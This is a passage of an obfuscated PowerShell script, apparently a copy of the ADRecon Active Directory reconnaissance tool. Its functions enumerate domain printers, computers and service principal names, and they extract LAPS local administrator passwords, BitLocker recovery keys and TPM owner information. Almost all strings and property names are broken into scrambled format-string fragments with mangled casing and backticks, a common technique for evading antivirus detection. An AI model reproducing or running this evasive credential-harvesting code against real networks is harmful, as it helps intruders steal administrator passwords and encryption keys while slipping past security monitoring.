    }

    If ($ADDNSNodesObj -and $ADRDNSRecords)
    {
        Export-ADR $ADDNSNodesObj $ADROutputDir $OutputType ("{1}{0}"-f 'es','DNSNod')
        Remove-Variable ADDNSNodesObj
    }
}

Function Get-ADRPrinter
{


    param(
        [Parameter(mAnDaTorY = $true)]
        [string] $Method,

        [Parameter(mAndaTorY = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(mandaTory = $true)]
        [int] $PageSize,

        [Parameter(MaNdaToRy = $false)]
        [int] $Threads = 10
    )

    If ($Method -eq ("{0}{1}"-f'A','DWS'))
    {
        Try
        {
            $ADPrinters = @( Get-ADObject -LDAPFilter (("{7}{6}{4}{1}{3}{8}{2}{0}{5}"-f 'Queu','tCategor','nt','y=','jec','e)','b','(o','pri')) -Properties driverName,driverVersion,Name,portName,printShareName,serverName,url,whenChanged,whenCreated )
        }
        Catch
        {
            Write-Warning ("{2}{13}{5}{9}{7}{4}{10}{0}{15}{1}{16}{12}{3}{14}{11}{6}{8}" -f'r w','l','[Get','t',']','P','tQueue ','ter','Objects','rin',' Erro','prin','era','-ADR','ing ','hi','e enum')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ($ADPrinters)
        {
            Write-Verbose "[*] Total Printers: $([ADRecon.ADWSClass]::ObjectCount($ADPrinters)) "
            $PrintersObj =   $ObR::("{2}{0}{1}" -f 'te','rParser','Prin').Invoke($ADPrinters, $Threads)
            Remove-Variable ADPrinters
        }
    }

    If ($Method -eq ("{1}{0}"-f'AP','LD'))
    {
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher."PagE`sizE" = $PageSize
        $ObjSearcher."fI`lTEr" = ("{1}{2}{0}{3}{4}"-f 'ntQu','(objectCategory=','pri','e','ue)')
        $ObjSearcher."s`EarCHsCo`Pe" = ("{0}{2}{1}"-f 'S','btree','u')

        Try
        {
            $ADPrinters = $ObjSearcher.("{0}{1}" -f 'F','indAll').Invoke()
        }
        Catch
        {
            Write-Warning ("{2}{6}{1}{10}{4}{8}{5}{12}{7}{3}{11}{0}{9}"-f't','D','[Ge','u','nter] Error w','r','t-A','e','hile enumerating p','s','RPri','e Objec','intQu')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.("{0}{1}" -f'disp','ose').Invoke()

        If ($ADPrinters)
        {
            $cnt = $(  $3Y9::("{0}{1}{3}{2}"-f 'Ob','je','unt','ctCo').Invoke($ADPrinters))
            If ($cnt -ge 1)
            {
                Write-Verbose ('['+'*] '+'To'+'tal '+'Pri'+'nte'+'rs: '+"$cnt")
                $PrintersObj =   (Gi  variabLe:3Y9 ).VALUE::("{1}{0}{2}{3}"-f 'n','Pri','ter','Parser').Invoke($ADPrinters, $Threads)
            }
            Remove-Variable ADPrinters
        }
    }

    If ($PrintersObj)
    {
        Return $PrintersObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRComputer
{

    param(
        [Parameter(mAndAtoRy = $true)]
        [string] $Method,

        [Parameter(MaNDATory = $true)]
        [DateTime] $date,

        [Parameter(maNDaTORY = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(mAnDAtORY = $true)]
        [int] $DormantTimeSpan = 90,

        [Parameter(mANDatoRY = $true)]
        [int] $PassMaxAge = 30,

        [Parameter(mAnDATORy = $true)]
        [int] $PageSize,

        [Parameter(ManDATORY = $false)]
        [int] $Threads = 10,

        [Parameter(mANdAToRy = $false)]
        [int] $ADRComputers = $true,

        [Parameter(mAndAtoRy = $false)]
        [int] $ADRComputerSPNs = $false
    )

    If ($Method -eq ("{1}{0}"-f 'WS','AD'))
    {
        If (!$ADRComputers)
        {
            Try
            {
                $ADComputers = @( Get-ADObject -LDAPFilter ((("{9}{7}{8}{2}{0}{5}{4}{3}{6}{1}" -f 'ype=',')','AccountT','pa','369)(servicePrinci','805306','lName=*)','&(sa','m','('))) -ResultPageSize $PageSize -Properties Name,servicePrincipalName )
            }
            Catch
            {
                Write-Warning ("{9}{1}{10}{7}{8}{5}{6}{4}{2}{0}{3}"-f'N Objec','t-A','puterSP','ts','m','or while en','umerating Co','ter] ','Err','[Ge','DRCompu')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
        }
        Else
        {
            Try
            {
                $ADComputers = @( Get-ADComputer -Filter * -ResultPageSize $PageSize -Properties Description,DistinguishedName,DNSHostName,Enabled,IPv4Address,LastLogonDate,("{1}{3}{2}{4}{5}{0}{6}" -f 'at','m','wedToDe','sDS-Allo','l','eg','eTo'),("{0}{2}{3}{4}{1}" -f 'ms-d','eatorSid','s-','C','r'),("{5}{7}{3}{6}{1}{0}{2}{8}{4}" -f 'onT','pti','y','orte','es','msD','dEncry','S-Supp','p'),Name,OperatingSystem,OperatingSystemHotfix,OperatingSystemServicePack,OperatingSystemVersion,PasswordLastSet,primaryGroupID,SamAccountName,servicePrincipalName,SID,SIDHistory,TrustedForDelegation,TrustedToAuthForDelegation,UserAccountControl,whenChanged,whenCreated )
            }
            Catch
            {
                Write-Warning ("{14}{10}{0}{4}{2}{8}{5}{3}{1}{11}{12}{13}{7}{9}{6}" -f'mputer','hile',' Er','w',']',' ','er Objects','pu','ror','t','t-ADRCo',' enu','mera','ting Com','[Ge')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
        }
        If ($ADComputers)
        {
            Write-Verbose "[*] Total Computers: $([ADRecon.ADWSClass]::ObjectCount($ADComputers)) "
            If ($ADRComputers)
            {
                $ComputerObj =   (gET-vaRiAble  obr  -VaLueoNLY)::("{3}{2}{0}{1}"-f'ut','erParser','mp','Co').Invoke($ADComputers, $date, $DormantTimeSpan, $PassMaxAge, $Threads)
            }
            If ($ADRComputerSPNs)
            {
                $ComputerSPNObj =   ( GET-VARiABLE obr ).VAlue::("{0}{2}{3}{1}" -f'Compu','SPNParser','te','r').Invoke($ADComputers, $Threads)
            }
            Remove-Variable ADComputers
        }
    }

    If ($Method -eq ("{1}{0}"-f'P','LDA'))
    {
        If (!$ADRComputers)
        {
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
            $ObjSearcher."pa`Ge`SizE" = $PageSize
            $ObjSearcher."fIL`TER" = ((("{2}{9}{11}{10}{13}{12}{4}{7}{8}{0}{6}{5}{3}{1}" -f'ePrinc','ame=*))','(&','N','tType=8053063','l','ipa','69)(s','ervic','(s','m','a','oun','Acc')))
            $ObjSearcher."pR`ope`Rt`iestoLoad".("{1}{0}"-f 'e','AddRang').Invoke((("{0}{1}" -f'nam','e'),("{2}{0}{3}{1}{4}"-f'erviceprin','palnam','s','ci','e')))
            $ObjSearcher."se`AR`CHS`COpe" = ("{2}{0}{1}" -f'ubtre','e','S')
            Try
            {
                $ADComputers = $ObjSearcher.("{1}{0}" -f 'All','Find').Invoke()
            }
            Catch
            {
                Write-Warning ("{11}{2}{12}{5}{6}{10}{4}{7}{0}{1}{9}{3}{8}" -f 'puterSPN',' ','t-ADRComputer]','bject','umerating C','rror wh','il','om','s','O','e en','[Ge',' E')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
            $ObjSearcher.("{2}{0}{1}" -f'os','e','disp').Invoke()
        }
        Else
        {
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
            $ObjSearcher."paG`esIZE" = $PageSize
            $ObjSearcher."F`ILTeR" = ("{2}{0}{1}{4}{5}{3}" -f 'm','AccountType=','(sa','6369)','8','0530')
            $ObjSearcher."pROP`e`RTIEs`TO`loaD".("{2}{1}{0}"-f 'nge','Ra','Add').Invoke((("{2}{3}{0}{1}"-f'cr','iption','d','es'),("{3}{2}{0}{1}"-f 'hednam','e','tinguis','dis'),("{0}{3}{1}{2}" -f'dn','os','tname','sh'),("{2}{0}{3}{1}{4}{5}" -f'tl','gonti','las','o','me','stamp'),("{4}{3}{0}{6}{1}{5}{2}"-f'DS-A','ed','o','s','m','ToDelegateT','llow'),("{2}{3}{1}{0}" -f 'id','atorS','ms-d','s-Cre'),("{7}{2}{5}{4}{3}{8}{0}{6}{1}"-f'ncrypt','ypes','-S','r','ppo','u','ionT','msDS','tedE'),("{1}{0}"-f 'me','na'),("{0}{2}{1}" -f 'ob','ectsid','j'),("{2}{1}{3}{0}" -f'm','s','operating','yste'),("{0}{4}{3}{1}{2}" -f'ope','em','hotfix','syst','rating'),("{4}{6}{1}{3}{0}{2}{5}{7}" -f 'ems','ng','ervic','syst','op','ep','erati','ack'),("{5}{3}{6}{1}{4}{2}{0}"-f'n','syst','o','p','emversi','o','erating'),("{0}{1}{3}{2}" -f 'prim','arygr','pid','ou'),("{2}{0}{3}{1}" -f 's','t','pwdlast','e'),("{1}{2}{0}{3}"-f'ntnam','sama','ccou','e'),("{0}{2}{3}{4}{1}{5}" -f'se','ip','rv','icep','rinc','alname'),("{2}{1}{0}" -f 'dhistory','i','s'),("{0}{2}{1}{3}"-f 'use','tcon','raccoun','trol'),("{1}{3}{2}{0}"-f 'nged','wh','cha','en'),("{1}{2}{3}{0}"-f 'd','wh','encre','ate')))
            $ObjSearcher."SEar`cHSc`ope" = ("{2}{0}{1}"-f 'ubtre','e','S')

            Try
            {
                $ADComputers = $ObjSearcher.("{2}{0}{1}" -f 'in','dAll','F').Invoke()
            }
            Catch
            {
                Write-Warning ("{10}{6}{8}{7}{5}{1}{12}{11}{4}{9}{0}{2}{3}"-f'omputer ','ror wh','Obj','ects','g ','] Er','C','er','omput','C','[Get-ADR','ratin','ile enume')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
            $ObjSearcher.("{2}{1}{0}" -f 'e','pos','dis').Invoke()
        }

        If ($ADComputers)
        {
            Write-Verbose "[*] Total Computers: $([ADRecon.LDAPClass]::ObjectCount($ADComputers)) "
            If ($ADRComputers)
            {
                $ComputerObj =  (  VArIaBLE ("3"+"Y9") ).vaLUe::("{1}{4}{0}{2}{3}"-f'terPa','Com','rse','r','pu').Invoke($ADComputers, $date, $DormantTimeSpan, $PassMaxAge, $Threads)
            }
            If ($ADRComputerSPNs)
            {
                $ComputerSPNObj =  (VariABlE ('3'+'Y9') -VaLuEONl  )::("{1}{3}{0}{4}{2}" -f'PNP','Compute','r','rS','arse').Invoke($ADComputers, $Threads)
            }
            Remove-Variable ADComputers
        }
    }

    If ($ComputerObj)
    {
        Export-ADR -ADRObj $ComputerObj -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{1}{0}{2}"-f'e','Comput','rs')
        Remove-Variable ComputerObj
    }
    If ($ComputerSPNObj)
    {
        Export-ADR -ADRObj $ComputerSPNObj -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{1}{2}{0}" -f 'SPNs','C','omputer')
        Remove-Variable ComputerSPNObj
    }
}


Function Get-ADRLAPSCheck
{

    param(
        [Parameter(mAndatoRY = $true)]
        [string] $Method,

        [Parameter(manDAtOrY = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(mANDAToRy = $true)]
        [int] $PageSize,

        [Parameter(maNdATORy = $false)]
        [int] $Threads = 10
    )

    If ($Method -eq ("{0}{1}"-f'AD','WS'))
    {
        Try
        {
            $ADComputers = @( Get-ADObject -LDAPFilter ("{0}{2}{3}{4}{1}{5}{6}" -f '(sa','Type=8053','m','Ac','count','063','69)') -Properties CN,DNSHostName,("{1}{2}{0}" -f 'mPwd','m','s-Mcs-Ad'),("{6}{7}{4}{5}{0}{3}{2}{1}"-f'pir','Time','on','ati','d','Ex','ms-Mc','s-AdmPw') -ResultPageSize $PageSize )
        }
        Catch [System.ArgumentException]
        {
            Write-Warning ("{0}{1}{3}{4}{2}" -f '[*] LAPS is n','ot','ed.',' implemen','t')
            Return $null
        }
        Catch
        {
            Write-Warning ("{2}{5}{4}{0}{8}{6}{1}{3}{9}{7}"-f'-','eck] Error while en','[','um','et','G','DRLAPSCh','jects','A','erating LAPS Ob')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ($ADComputers)
        {
            Write-Verbose "[*] Total LAPS Objects: $([ADRecon.ADWSClass]::ObjectCount($ADComputers)) "
            $LAPSObj =  (GEt-vARiABLe ("ob"+"R") -VAL )::("{1}{2}{0}"-f'ser','LAPS','Par').Invoke($ADComputers, $Threads)
            Remove-Variable ADComputers
        }
    }

    If ($Method -eq ("{0}{1}" -f'L','DAP'))
    {
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher."P`AgeSIzE" = $PageSize
        $ObjSearcher."f`ILTER" = ("{2}{1}{3}{0}{4}" -f'=80530636','mAcco','(sa','untType','9)')
        $ObjSearcher."PROp`ER`T`ieSTOlO`AD".("{0}{2}{1}"-f 'A','ge','ddRan').Invoke(("cn",("{0}{1}{2}"-f 'dnshostn','a','me'),("{0}{1}{2}{3}" -f 'ms-mcs-a','dm','p','wd'),("{3}{1}{2}{4}{0}"-f'ntime','mcs','-admpwde','ms-','xpiratio')))
        $ObjSearcher."seAR`CHS`co`Pe" = ("{1}{2}{0}"-f'btree','S','u')
        Try
        {
            $ADComputers = $ObjSearcher.("{2}{0}{1}" -f 'Al','l','Find').Invoke()
        }
        Catch
        {
            Write-Warning ("{1}{2}{3}{7}{4}{0}{8}{6}{5}" -f 'erat','[Get','-ADRLAP','SChe','ror while enum','bjects',' O','ck] Er','ing LAPS')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.("{0}{1}{2}" -f 'd','isp','ose').Invoke()

        If ($ADComputers)
        {
            $LAPSCheck =   (  lS vAriABlE:3y9 ).vaLUE::("{1}{2}{0}"-f 'ck','LAPS','Che').Invoke($ADComputers)
            If (-Not $LAPSCheck)
            {
                Write-Warning ("{3}{7}{4}{1}{5}{2}{6}{8}{0}" -f'ted.','s no','mp','[*','APS i','t i','l','] L','emen')
                Return $null
            }
            Else
            {
                Write-Verbose "[*] Total LAPS Objects: $([ADRecon.LDAPClass]::ObjectCount($ADComputers)) "
                $LAPSObj =  $3Y9::("{0}{1}{2}" -f'LAP','S','Parser').Invoke($ADComputers, $Threads)
                Remove-Variable ADComputers
            }
        }
    }

    If ($LAPSObj)
    {
        Return $LAPSObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRBitLocker
{

    param(
        [Parameter(MAndAToRY = $true)]
        [string] $Method,

        [Parameter(manDAtory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(manDatoRY = $false)]
        [string] $DomainController,

        [Parameter(maNdAtoRy = $false)]
        [Management.Automation.PSCredential] $Credential =  $q3cUvm::"Em`pTy"
    )

    If ($Method -eq ("{0}{1}" -f'AD','WS'))
    {
        Try
        {
            $ADBitLockerRecoveryKeys = Get-ADObject -LDAPFilter (("{5}{4}{1}{7}{3}{6}{0}{2}"-f 'i','FVE-','on)','cover','ss=ms','(objectCla','yInformat','Re')) -Properties distinguishedName,msFVE-RecoveryPassword,msFVE-RecoveryGuid,msFVE-VolumeGuid,Name,whenCreated
        }
        Catch
        {
            Write-Warning ("{8}{9}{17}{3}{0}{5}{14}{16}{10}{12}{11}{13}{15}{2}{1}{7}{4}{6}" -f'r','n','I','ro','matio',' w','n Objects','for','[Get-ADRBit','Locker',' en','ng ms','umerati','FVE-Re','h','covery','ile','] Er')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ($ADBitLockerRecoveryKeys)
        {
            $cnt = $( $obR::("{1}{2}{0}"-f 'unt','ObjectC','o').Invoke($ADBitLockerRecoveryKeys))
            If ($cnt -ge 1)
            {
                Write-Verbose ('[*'+'] '+'To'+'tal '+'Bi'+'t'+'Lock'+'er '+'Recovery'+' '+'K'+'ey'+'s: '+"$cnt")
                $BitLockerObj = @()
                $ADBitLockerRecoveryKeys | ForEach-Object {
                    
                    $Obj = New-Object PSObject
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{2}{1}{0}{3}"-f'Nam','d ','Distinguishe','e') -Value $((($_."di`STiNG`UI`shEdNamE" -split '}')[1]).("{1}{2}{3}{0}" -f'g','s','ubst','rin').Invoke(1))
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}"-f'Na','me') -Value $_."NA`mE"
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{3}{2}{0}{1}"-f 'nCreate','d','e','wh') -Value $_."WhE`N`C`ReatED"
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}{2}{3}"-f'very K','Reco','ey ','ID') -Value $([GUID] $_.'msFVE-RecoveryGuid')
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{2}{1}" -f'Re','Key','covery ') -Value $_.'msFVE-RecoveryPassword'
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{2}{1}{0}"-f'UID',' G','Volume') -Value $([GUID] $_.'msFVE-VolumeGuid')
                    Try
                    {
                        $TempComp = Get-ADComputer -Identity $Obj.'Distinguished Name' -Properties msTPM-OwnerInformation,msTPM-TpmInformationForComputer
                    }
                    Catch
                    {
                        Write-Warning "[Get-ADRBitLocker] Error while enumerating $($Obj.'Distinguished Name') Computer Object "
                        Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                    }
                    If ($TempComp)
                    {
                        
                        $Obj | Add-Member -MemberType NoteProperty -Name ("{2}{3}{1}{0}" -f 'on','erInformati','msTP','M-Own') -Value $TempComp.'msTPM-OwnerInformation'

                        
                        $Obj | Add-Member -MemberType NoteProperty -Name ("{3}{2}{0}{1}{5}{4}" -f 'r','C','Fo','msTPM-TpmInformation','puter','om') -Value $TempComp.'msTPM-TpmInformationForComputer'
                        If ($null -ne $TempComp.'msTPM-TpmInformationForComputer')
                        {
                            
                            $TPMObject = Get-ADObject -Identity $TempComp.'msTPM-TpmInformationForComputer' -Properties msTPM-OwnerInformation
                            $TPMRecoveryInfo = $TPMObject.'msTPM-OwnerInformation'
                        }
                        Else
                        {
                            $TPMRecoveryInfo = $null
                        }
                    }
                    Else
                    {
                        $Obj | Add-Member -MemberType NoteProperty -Name ("{4}{2}{3}{1}{0}"-f 'n','formatio','Owne','rIn','msTPM-') -Value $null
                        $Obj | Add-Member -MemberType NoteProperty -Name ("{3}{6}{4}{0}{2}{1}{5}"-f 'mIn','orm','f','msT','M-Tp','ationForComputer','P') -Value $null
                        $TPMRecoveryInfo = $null

                    }
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}{3}{2}"-f' Pas','TPM Owner','d','swor') -Value $TPMRecoveryInfo
                    $BitLockerObj += $Obj
                }
            }
            Remove-Variable ADBitLockerRecoveryKeys
        }
    }

    If ($Method -eq ("{0}{1}" -f 'L','DAP'))
    {
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher."pagESi`ze" = $PageSize
        $ObjSearcher."Fi`LTer" = ("{0}{8}{1}{7}{5}{10}{4}{2}{3}{6}{9}" -f '(ob','ctC','c','overy','Re','=msFV','Informati','lass','je','on)','E-')
        $ObjSearcher."p`RopERtiEs`ToloAD".("{1}{0}"-f'e','AddRang').Invoke((("{2}{3}{0}{1}"-f 'Nam','e','dis','tinguished'),("{3}{1}{2}{6}{0}{5}{4}"-f'pas','-re','cover','msfve','word','s','y'),("{1}{0}{4}{3}{2}"-f 's','m','veryguid','-reco','fve'),("{0}{1}{3}{4}{2}" -f 'msfve-','v','id','olumeg','u'),("{0}{1}{5}{4}{3}{2}"-f'mstpm-o','wneri','ion','mat','or','nf'),("{8}{6}{3}{2}{1}{7}{5}{4}{0}"-f 'uter','rma','fo','m-tpmin','onforcomp','i','stp','t','m'),("{1}{0}" -f'ame','n'),("{3}{2}{1}{0}" -f'ated','e','r','whenc')))
        $ObjSearcher."s`Ea`RcHSCOpe" = ("{0}{1}"-f'S','ubtree')

        Try
        {
            $ADBitLockerRecoveryKeys = $ObjSearcher.("{2}{1}{0}" -f'l','indAl','F').Invoke()
        }
        Catch
        {
            Write-Warning ("{15}{11}{3}{4}{12}{16}{7}{6}{10}{2}{8}{9}{1}{13}{0}{14}{5}" -f 'O','rm','ng msFVE-','t-A','DRB','ts','mer','cker] Error while enu','RecoveryInf','o','ati','Ge','itL','ation ','bjec','[','o')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.("{1}{0}"-f'e','dispos').Invoke()

        If ($ADBitLockerRecoveryKeys)
        {
            $cnt = $(  (Gi ('vaRi'+'ABle:'+'3y9') ).VAlue::("{1}{2}{3}{0}" -f 'nt','Object','C','ou').Invoke($ADBitLockerRecoveryKeys))
            If ($cnt -ge 1)
            {
                Write-Verbose ('['+'*] '+'Tota'+'l '+'B'+'itLocke'+'r'+' '+'R'+'ec'+'overy '+'Ke'+'ys: '+"$cnt")
                $BitLockerObj = @()
                $ADBitLockerRecoveryKeys | ForEach-Object {
                    
                    $Obj = New-Object PSObject
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{5}{2}{3}{4}{0}"-f 'e','D','nguis','hed',' Nam','isti') -Value $((($_."pRoPER`T`iEs"."Di`ST`Ingu`i`SheDnAMe" -split '}')[1]).("{1}{0}{2}"-f'trin','subs','g').Invoke(1))
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}" -f'e','Nam') -Value ([string] ($_."pR`o`pE`RTIes"."n`AMe"))
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{2}{1}{0}"-f 'ted','nCrea','whe') -Value ([DateTime] $($_."pro`PeRTi`ES"."Whenc`REA`TEd"))
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{3}{0}{4}{1}{2}" -f 'y',' ','ID','Recover',' Key') -Value $([GUID] $_."PRopEr`T`Ies".'msfve-recoveryguid'[0])
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{2}{1}{3}{0}"-f 'ey','eco','R','very K') -Value ([string] ($_."P`RO`PeRtIES".'msfve-recoverypassword'))
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{2}{1}"-f 'Vo',' GUID','lume') -Value $([GUID] $_."Pro`Pe`RT`iEs".'msfve-volumeguid'[0])

                    $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
                    $ObjSearcher."pag`es`izE" = $PageSize
                    $ObjSearcher."fIlt`eR" = "(&(samAccountType=805306369)(distinguishedName=$($Obj.'Distinguished Name'))) "
                    $ObjSearcher."p`Ro`peRTIESTo`LO`Ad".("{2}{0}{1}"-f 'g','e','AddRan').Invoke((("{0}{4}{2}{5}{3}{1}"-f'mst','mation','m-own','for','p','erin'),("{4}{1}{0}{5}{2}{3}" -f'n','pm-tpmi','ionf','orcomputer','mst','format')))
                    $ObjSearcher."s`ea`R`ChsCOPE" = ("{1}{0}{2}" -f'ubtr','S','ee')

                    Try
                    {
                        $TempComp = $ObjSearcher.("{1}{2}{0}"-f'dAll','Fi','n').Invoke()
                    }
                    Catch
                    {
                        Write-Warning "[Get-ADRBitLocker] Error while enumerating $($Obj.'Distinguished Name') Computer Object "
                        Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                    }
                    $ObjSearcher.("{0}{1}"-f'di','spose').Invoke()

                    If ($TempComp)
                    {
                        
                        $Obj | Add-Member -MemberType NoteProperty -Name ("{2}{5}{0}{1}{4}{3}"-f'w','n','msTPM','tion','erInforma','-O') -Value $([string] $TempComp."P`RoPE`RTIeS".'mstpm-ownerinformation')

                        
                        $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{5}{7}{2}{4}{3}{0}{8}{6}" -f'p','m','-','tionForCom','TpmInforma','s','er','TPM','ut') -Value $([string] $TempComp."p`R`OPer`TIes".'mstpm-tpminformationforcomputer')
                        If ($null -ne $TempComp."Pr`oPErT`IEs".'mstpm-tpminformationforcomputer')
                        {
                            
                            If ($Credential -ne   (vARiaBlE  q3CuVm -VALUe )::"EmP`Ty")
                            {
                                $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$($TempComp.Properties.'mstpm-tpminformationforcomputer')", $Credential."u`Ser`NaMe",$Credential.("{3}{0}{2}{4}{1}"-f'etNetwor','al','kCreden','G','ti').Invoke()."PaSS`W`ord"
                                $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
                                $objSearcherPath."P`ROpE`RtiEST`OLOAd".("{0}{1}{2}" -f'A','ddR','ange').Invoke((("{3}{0}{2}{1}{4}{6}{5}"-f 'tpm-ow','nfor','neri','ms','m','on','ati')))
                                Try
                                {
                                    $TPMObject = $objSearcherPath.("{0}{1}" -f 'FindAl','l').Invoke()
                                }
                                Catch
                                {
                                    Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                                }
                                $objSearcherPath.("{0}{2}{1}"-f 'di','ose','sp').Invoke()

                                If ($TPMObject)
                                {
                                    $TPMRecoveryInfo = $([string] $TPMObject."pR`oPerTI`ES".'mstpm-ownerinformation')
                                }
                                Else
                                {
                                    $TPMRecoveryInfo = $null
                                }
                            }
                            Else
                            {
                                Try
                                {
                                    $TPMObject = ([ADSI]"LDAP://$($TempComp.Properties.'mstpm-tpminformationforcomputer')")
                                }
                                Catch
                                {
                                    Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                                }
                                If ($TPMObject)
                                {
                                    $TPMRecoveryInfo = $([string] $TPMObject."prOP`eRT`Ies".'mstpm-ownerinformation')
                                }
                                Else
                                {
                                    $TPMRecoveryInfo = $null
                                }
                            }
                        }
                    }
                    Else
                    {
                        $Obj | Add-Member -MemberType NoteProperty -Name ("{5}{4}{0}{3}{2}{1}" -f 'PM-OwnerInf','n','io','ormat','T','ms') -Value $null
                        $Obj | Add-Member -MemberType NoteProperty -Name ("{5}{6}{3}{2}{0}{7}{4}{1}"-f'i','er','mat','Infor','t','ms','TPM-Tpm','onForCompu') -Value $null
                        $TPMRecoveryInfo = $null
                    }
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{3}{0}{2}{1}" -f'Owne','rd','r Passwo','TPM ') -Value $TPMRecoveryInfo
                    $BitLockerObj += $Obj
                }
            }
            Remove-Variable cnt
            Remove-Variable ADBitLockerRecoveryKeys
        }
    }

    If ($BitLockerObj)
    {
        Return $BitLockerObj
    }
    Else
    {
        Return $null
    }
}


Function ConvertFrom-SID
{

    Param(
        [Parameter(MandatORY = $true)]
        [string] $Method,

        [Parameter(manDATory = $true)]
        [Alias('SID')]
        
        [String]
        $ObjectSid,

        [Parameter(mAnDATOry = $false)]
        [string] $DomainFQDN,

        [Parameter(maNdATory = $false)]
        [Management.Automation.PSCredential] $Credential =   (  lS ("VarI"+"abLe"+":q"+"3C"+"uVm") ).valUE::"EMP`Ty",

        [Parameter(maNdaTOrY = $false)]
        [bool] $ResolveSID = $false
    )

    BEGIN {
        
        
        $ADS_NAME_INITTYPE_DOMAIN   = 1 
        
        $ADS_NAME_INITTYPE_GC       = 3 

        
        
        
        
        $ADS_NAME_TYPE_NT4                      = 3 
        
        
        
        
        $ADS_NAME_TYPE_UNKNOWN                  = 8 
        
        
        
        

        
        
        
        
        $ADS_CHASE_REFERRALS_ALWAYS      = (0x60) 
    }

    PROCESS {
        $TargetSid = $($ObjectSid.("{1}{0}{2}"-f'r','TrimSta','t').Invoke("O:"))
        $TargetSid = $($TargetSid.("{0}{1}" -f 'Tri','m').Invoke('*'))
        If ($TargetSid -match ("{0}{1}{2}"-f'^S-','1','-.*'))
        {
            Try
            {
                
                Switch ($TargetSid) {
                    ("{0}{1}"-f'S-1','-0')         { ("{3}{2}{1}{0}"-f 'rity','o','l Auth','Nul') }
                    ("{1}{0}" -f'-0-0','S-1')       { ("{0}{1}"-f'Nobod','y') }
                    ("{0}{1}"-f'S-1','-1')         { ("{0}{3}{1}{2}"-f'W','u','thority','orld A') }
                    ("{0}{1}"-f 'S','-1-1-0')       { ("{2}{1}{0}" -f 'ne','veryo','E') }
                    ("{1}{0}"-f '-1-2','S')         { ("{2}{0}{4}{1}{3}"-f'al A','tho','Loc','rity','u') }
                    ("{1}{0}"-f'0','S-1-2-')       { ("{0}{1}" -f'L','ocal') }
                    ("{0}{1}" -f 'S-','1-2-1')       { ("{3}{4}{1}{2}{0}" -f'gon ',' ','Lo','Consol','e') }
                    ("{0}{1}"-f'S','-1-3')         { ("{0}{3}{2}{1}"-f'Creat','ority','th','or Au') }
                    ("{0}{1}{2}" -f 'S-1','-3-','0')       { ("{2}{3}{4}{0}{1}"-f 'tor O','wner','C','re','a') }
                    ("{0}{1}" -f 'S-','1-3-1')       { ("{2}{0}{1}"-f 'reator ','Group','C') }
                    ("{0}{1}" -f'S-1','-3-2')       { ("{1}{2}{3}{0}{4}" -f' Ow','C','rea','tor','ner Server') }
                    ("{2}{0}{1}"-f'3-','3','S-1-')       { ("{2}{4}{0}{5}{3}{1}"-f'ator',' Server','Cr','p','e',' Grou') }
                    ("{2}{1}{0}"-f'-4','-1-3','S')       { ("{2}{1}{3}{0}"-f 'hts','er R','Own','ig') }
                    ("{0}{1}" -f'S-','1-4')         { ("{3}{1}{2}{0}{4}"-f'uthorit','e ','A','Non-uniqu','y') }
                    ("{0}{1}"-f'S-1-','5')         { ("{3}{0}{1}{2}" -f 'uthor','i','ty','NT A') }
                    ("{0}{1}{2}" -f 'S-','1-','5-1')       { ("{1}{0}"-f'alup','Di') }
                    ("{1}{2}{0}"-f'-2','S-1','-5')       { ("{0}{1}"-f 'Netw','ork') }
                    ("{1}{0}"-f'3','S-1-5-')       { ("{1}{0}" -f 'tch','Ba') }
                    ("{0}{2}{1}"-f'S-1-','-4','5')       { ("{0}{1}{2}"-f 'Int','erac','tive') }
